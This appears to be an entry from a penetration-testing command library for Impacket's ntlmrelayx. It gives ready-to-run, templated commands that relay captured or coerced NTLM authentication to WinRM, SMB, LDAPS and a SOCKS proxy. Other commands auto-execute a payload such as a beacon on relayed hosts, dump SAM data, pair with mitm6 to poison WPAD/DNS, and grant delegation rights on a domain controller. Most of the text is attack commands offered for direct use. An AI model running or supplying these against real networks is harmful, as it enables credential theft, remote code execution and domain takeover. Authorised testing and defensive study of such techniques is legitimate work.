# Ntlmrelayx
> Impacket NTLM relay multi-tool: catch coerced/poisoned NTLM auth and relay it to SMB, LDAPS, WinRM, or a SOCKS pool.

<!-- tags: ad,ntlmrelayx,impacket,ntlm-relay,coercion,mitm6,exploit -->

---

## relay coerced ntlm to winrm
Catch coerced NTLM auth and relay it to WinRM (5985) on the target. -smb2support lets the SMB receiver accept SMBv2/3.

```bash
ntlmrelayx.py -smb2support -t winrms://{{TARGET:ip}}
```

<!-- meta: risk=high | phase=exploit | tags=relay,winrm,coercion -->

---

## relay to smb drop payload
Relay coerced NTLM to SMB on the targets in the file and auto-exec a payload (msfvenom output, beacon) under the relayed user.

```bash
ntlmrelayx.py -tf {{TARGETS_FILE:file:targets.txt}} -smb2support -e {{PAYLOAD:file:payload.exe}}
```

<!-- meta: risk=critical | phase=exploit | tags=relay,smb,exec,payload -->

---

## relay to socks proxy
Stand up a SOCKS proxy backed by relayed sessions. Drive any tool through a captured session with proxychains.

```bash
ntlmrelayx.py -tf {{TARGETS_FILE:file:targets.txt}} -socks -smb2support
```

<!-- meta: risk=high | phase=exploit | tags=relay,socks,proxychains -->

---

## relay to smb and dump
Default relay to SMB and dump captured info (SAM, shares, etc.) for each successful relay.

```bash
ntlmrelayx.py -tf {{TARGETS_FILE:file:targets.txt}} -smb2support
```

<!-- meta: risk=high | phase=post | tags=relay,smb,dump,sam -->

---

## mitm6 relay to smb socks
Pair with mitm6 to redirect WPAD/DNS, then relay the resulting NTLM to SMB on the target. -wh is the attacker IP advertised as WPAD.

```bash
ntlmrelayx.py -6 -wh {{LHOST:ip}} -t smb://{{TARGET:ip}} -l /tmp -socks -debug
```

<!-- meta: risk=high | phase=exploit | tags=relay,mitm6,smb,socks -->

---

## mitm6 relay to ldaps delegate
Relay coerced NTLM to LDAPS on the DC and abuse it to grant RBCD/delegation rights - classic mitm6 escalation step.

```bash
ntlmrelayx.py -t ldaps://{{TARGET:ip}} -wh {{LHOST:ip}} --delegate-access
```

<!-- meta: risk=critical | phase=exploit | tags=relay,ldaps,rbcd,delegate -->
